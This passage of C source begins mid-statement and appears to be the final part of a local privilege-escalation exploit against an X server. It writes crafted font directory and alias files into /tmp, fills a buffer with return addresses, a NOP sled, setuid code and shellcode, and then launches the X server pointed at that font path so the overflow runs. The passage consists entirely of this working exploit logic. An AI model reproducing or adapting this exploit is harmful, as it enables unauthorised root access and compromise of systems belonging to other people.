",adr+12000); b=buffer; strcpy(buffer,"1
"); strcat(buffer,"aaaa.pcf -aaaa-fixed-small-a-semicondensed--1-1-1-1-a-1-iso1111-1
"); fd=open("/tmp/fonts.dir",O_CREAT|O_WRONLY,0666); write(fd,buffer,strlen(buffer)); for(i=0;i<ADRNUM;i++) *b++=adr[i%4]; *b++='
'; fd=open("/tmp/fonts.alias",O_CREAT|O_WRONLY,0666); write(fd,buffer,strlen(buffer)); close(fd); b=&buffer[2000]; for(i=0;i<NOPNUM-strlen(setuidcode)-strlen(setuidcode)-strlen(shellcode);i++) *b++=0x90; for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i]; for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i]; *b=0; execle("/usr/bin/X11/X","X",":0","-fp","/tmp",0,envp); }

